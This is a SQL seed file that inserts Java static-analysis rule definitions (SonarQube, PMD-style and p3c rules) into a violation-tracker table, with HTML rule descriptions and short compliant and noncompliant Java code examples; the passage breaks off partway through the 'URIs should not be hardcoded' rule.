INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('cb156ee3-f242-4181-ad26-e9af029fe106', '[p3c]When using regex, precompile needs to be done in order to increase the matching performance.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('cc864084-a34c-46a0-a9ab-5ea0c5df0477', '[p3c]iBatis built in com.ibatis.sqlmap.client.SqlMapClient.queryForList(String statementName,int start,int size) is not recommended', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('cd40a648-990b-455b-acfa-795283b6a3f9', '[p3c]Do not cast subList in class ArrayList, otherwise ClassCastException will be thrown.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('cd4bc267-8b9b-487f-89c4-dfd268618476', 'Assignment To Non Final Static', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('cd525bf0-84db-4312-9102-8f0c0a83195a', 'Avoid Using Short Type', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('cf47404d-c027-47ff-bcff-8d6bf60896c0', 'String Instantiation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('cfa1c602-0702-4b10-8165-eff444603f02', 'Proper clone implementation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d002c7d0-4905-4fc6-8653-12def7535af7', 'Unsynchronized Static Date Formatter', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d028dceb-32fe-45e2-a592-fb49e6f4968b', 'Use Array List Instead Of Vector', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d119c5d5-893c-47cc-924a-190eb90d6f97', 'Avoid Print Stack Trace', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d231c59c-971f-42e5-b73d-adf86c41968d', '"@RequestMapping" methods should specify HTTP method', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d2336d41-a916-4194-906c-2bc48a878992', 'Naming - Method with same name as enclosing class', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d3247f09-50d4-42af-adef-5db05b624bc1', '[p3c]All enumeration type fields should be commented as Javadoc style.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d4a42656-c8b8-4a22-b331-ce0252338179', 'Naming - Avoid field name matching method name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d5cc2d87-2472-472b-86ae-bd61c893e756', 'Unnecessary boolean assertion', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d600ebb1-787b-4484-98b1-1731b8b6b8e3', 'Java5 migration - Long instantiation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d60c4bd6-ef3e-4431-84a2-b80227297bb6', 'Finalize Should Be Protected', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d6aa2d39-b504-409d-ab81-64266daf65ba', 'Signature Declare Throws Exception (With Type Resolution)', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d6dd9ffb-b7c3-4c61-be89-47c6aac3b6e8', 'Android - call super first', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d7934c90-8a60-49d3-80b4-fb4e30907f40', 'Uncommented Empty Method', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d8182e44-13f6-48a9-90ad-d771669397de', 'Local Home Naming Convention', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('d860b2e2-8ee0-4f33-85b6-16068706db55', 'Too few branches for a switch statement', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('da2ca9e5-a8df-4511-9376-2275b462aaaa', 'Flags unnecessary qualified usages of this', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('da46a966-b43c-4be2-b7a6-ddee37975291', 'Abstract Class Without Abstract Method', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('db866a19-b94c-48b0-a450-e94ccdf8328d', 'Unused Null Check In Equals', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('dc2a547c-8bd9-4dda-bb8c-420343bb69ca', 'Logger Is Not Static Final', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('dca12c37-7872-4276-86dc-d23321456924', 'Java 8 features should be preferred to Guava', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('dce34aa4-0204-40e8-af5d-994df94e00d9', 'Preserve Stack Trace', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('de6e41e4-cdf6-4012-bfe7-7cf6cb6e29f7', 'Coupling between objects', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('de95df00-f2f8-4156-8aeb-2356b8938a17', 'Local variable could be final', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('df83e105-91e0-4775-8d7c-66068f5d6515', 'Simple Date Format Needs Locale', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e0a4c1e5-22f7-4d45-96f9-739f58728381', 'Naming - Avoid field name matching type name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e0fbe721-9041-4bc1-94e9-c85c6f654b77', 'Clone Throws Clone Not Supported Exception', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e1de38c7-5cf8-4e53-8884-857c21a03bdc', 'Replace Enumeration With Iterator', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e2c4bb2f-611a-4c3c-aeb7-052dbf650e4e', 'Useless Overriding Method', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e3b81c03-86a1-4df0-8aaa-a056c730f944', 'Dataflow Anomaly Analysis', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e3c95b71-8077-46fe-95e6-34932989c597', 'Unnecessary Return', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e51b2670-d322-4da6-9433-3c4c9429cb52', 'Law Of Demeter', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e64ade6f-1cf3-453a-ba3c-0975a3e28007', 'Useless Parentheses', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e6c7b313-3971-45cf-9f20-5a249538c563', '[p3c]All Service and DAO classes must be interface based on SOA principle. Implementation class names.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e6ef2268-e10c-4ea4-85fa-21fe336c959e', '[p3c]Abstract methods (including methods in interface) should be commented by Javadoc.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e740d6fe-cae9-49fb-86d4-91e2a8781911', 'Lines should have sufficient coverage by tests', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e94182b4-4e83-4897-89f9-b100880440d3', 'Guard Log Statement', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('e975be9e-6be7-436f-be0a-7a5cc36e3768', 'Avoid Losing Exception Information', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ea740150-3b05-4e9e-a902-19c61e9c2774', 'Jumbled Incrementer', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('eae262e9-7120-4c7a-a3b6-bf50665728d2', 'String To String', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ebb05259-86dd-4d4f-86a6-03d9a915cc77', 'Boolean Instantiation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ebd988f0-c9d9-4a5b-997d-218247a4d7ab', 'Security - Method returns internal array', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ebf69354-5b22-48e4-a7a6-87226398b6f1', 'Use Arrays As List', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ec38b9f8-508e-42b4-877b-8a45e240ef84', 'Dont Call Thread Run', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ed9d0f2f-0e72-4a7e-bd52-17cc28a3073c', 'Class with only private constructors should be final', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('eef339c1-8f9b-4960-8143-8d20d4b465c3', 'One Declaration Per Line', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ef367e9a-c1ad-4d59-93c7-194fa16bbeab', 'Literal boolean values should not be used in assertions', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ef387b01-a1bc-4868-8a55-d59670ce07a5', 'Double checked locking', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ef3af05f-216f-4b6e-bbb8-17d2f60550cb', '[p3c]Rules for using primitive data types and wrapper classes.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ef88010d-e39a-404a-8ee8-aeb0edaa68c2', 'JUnit assertions should include messages', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('effdb5d6-063e-44c2-8460-bdfa4fed701c', 'Comment Required', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f04510e4-e184-4469-83f4-5af07c74c081', 'Custom resources should be closed', 'sonarqube', 'BUG', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f0a0ff2d-a337-4899-8a62-26c69950a0d5', 'For Loops Must Use Braces', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f0cfadd6-a59f-40d3-b585-bc155990c8bb', 'Comment the default access modifier', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f10c57b3-0af9-42a8-a548-4ef8d4be616d', 'Naming - Suspicious equals method name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f433afbe-5475-4f34-aaaf-8419c996da09', 'The Object.finalize() method should not be overriden', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f4b2b33e-f8fe-467d-9709-fe86cbf9a94e', 'Override both equals and hashcode', 'sonarqube', 'BUG', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f55f2ce2-8708-410a-8ff6-826cfdf95358', 'Null Assignment', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f5cc2e30-5dce-4aa0-b15e-92547a6b62f9', 'Method Argument Could Be Final', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f5f1e1de-4de6-48a0-aec2-12be2b9cd786', '[p3c]should be called in finally block.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f754e3db-735c-47ba-ba73-ffdaa5c96a2b', 'Replace Hashtable With Map', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('f905b5cd-015a-40b3-a267-ff601022b01f', 'Too Many Static Imports', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('fb488b4f-69b6-4972-aefa-260b934996ae', 'Consecutive Literal Appends', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('fc41e552-7acc-4f8f-a768-c53eb9c74a5f', 'Naming - Misleading variable name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('fcf4b2d7-f302-468c-a9c6-065bf2994f30', 'Redundant Field Initializer', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('fdc838a0-4983-46d4-9756-ced60754b701', 'Field Declarations Should Be At Start Of Class', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('fe8a3772-59b3-4e62-9335-c50a50029d0b', 'Dont Import Java Lang', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('fefbf4cc-5f75-4353-82f2-b65687c513ed', 'Empty Finalizer', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ffb8d057-eb0d-4cde-85e8-daf00599d6d1', 'Naming - Short method name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:NoSonar', 'Track uses of "NOSONAR" comments', 'sonarqube', 'Code Smell', '<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S100', 'Method names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all method names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public int DoSomething(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int doSomething(){...}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are excluded. </p>
<pre>
@Override
public int Do_Something(){...}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S101', 'Class names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S103', 'Lines should not be too long', 'sonarqube', 'Code Smell', '<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S104', 'Files should not have too many lines of code', 'sonarqube', 'Code Smell', '<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S105', 'Tabulation characters should not be used', 'sonarqube', 'Code Smell', '<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S106', 'Standard outputs should not be used directly to log anything', 'sonarqube', 'Code Smell', '<p>When logging a message there are several important requirements which must be fulfilled:</p>
<ul>
  <li> The user must be able to easily retrieve the logs </li>
  <li> The format of all logged message must be uniform to allow the user to easily read the log </li>
  <li> Logged data must actually be recorded </li>
  <li> Sensitive data must only be logged securely </li>
</ul>
<p>If a program directly writes to the standard outputs, there is absolutely no way to comply with those requirements. That''s why defining and using a
dedicated logger is highly recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.out.println("My Message");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log("My Message");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/nzdGBQ">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1065', 'Unused labels should be removed', 'sonarqube', 'Code Smell', '<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>
<p>This will improve maintainability as developers will not wonder what this label is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() {
  outer: //label is not used.
  for(int i = 0; i&lt;10; i++) {
    break;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() {
  for(int i = 0; i&lt;10; i++) {
    break;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5dUxBQ">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1066', 'Collapsible "if" statements should be merged', 'sonarqube', 'Code Smell', '<p>Merging collapsible <code>if</code> statements increases the code''s readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (file != null) {
  if (file.isFile() || file.isDirectory()) {
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (file != null &amp;&amp; isFileOrDirectory(file)) {
  /* ... */
}

private static boolean isFileOrDirectory(File file) {
  return file.isFile() || file.isDirectory();
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1067', 'Expressions should not be too complex', 'sonarqube', 'Code Smell', '<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression''s complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }
</pre>
<h2>Exceptions</h2>
<p>No issue is reported inside <code>equals</code> methods, because it is common to compare all the fields of a class for equality inside this kind of
method.</p>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1068', 'Unused "private" fields should be removed', 'sonarqube', 'Code Smell', '<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will
improve maintainability because developers will not wonder what the variable is used for.</p>
<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> fields that are only
accessed using the reflection API.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private int foo = 42;

  public int compute(int a) {
    return a * 42;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public int compute(int a) {
    return a * 42;
  }
}
</pre>
<h2>Exceptions</h2>
<p>The Java serialization runtime associates with each serializable class a version number, called <code>serialVersionUID</code>, which is used during
deserialization to verify that the sender and receiver of a serialized object have loaded classes for that object that are compatible with respect to
serialization.</p>
<p>A serializable class can declare its own <code>serialVersionUID</code> explicitly by declaring a field named <code>serialVersionUID</code> that
must be static, final, and of type long. By definition those <code>serialVersionUID</code> fields should not be reported by this rule:</p>
<pre>
public class MyClass implements java.io.Serializable {
  private static final long serialVersionUID = 42L;
}
</pre>
<p>Moreover, this rule doesn''t raise any issue on annotated fields.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S107', 'Methods should not have too many parameters', 'sonarqube', 'Code Smell', '<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, String param4, long param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, String param4) {
...
}
</pre>
<h2>Exceptions</h2>
<p>Methods annotated with :</p>
<ul>
  <li> Spring''s <code>@RequestMapping</code> (and related shortcut annotations, like <code>@GetRequest</code>) </li>
  <li> JAX-RS API annotations (like <code>@javax.ws.rs.GET</code>) </li>
  <li> Bean constructor injection with <code>@org.springframework.beans.factory.annotation.Autowired</code> </li>
  <li> CDI constructor injection with <code>@javax.inject.Inject</code> </li>
  <li> <code>@com.fasterxml.jackson.annotation.JsonCreator</code> </li>
</ul>
<p>may have a lot of parameters, encapsulation being possible. Such methods are therefore ignored.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1075', 'URIs should not be hardcoded', 'sonarqube', 'Code Smell', '<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI''s or path delimiters are hard coded.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  public Collection&lt;User&gt; listUsers() {
    File userList = new File("/home/mylogin/Dev/users.txt"); // Non-Compliant
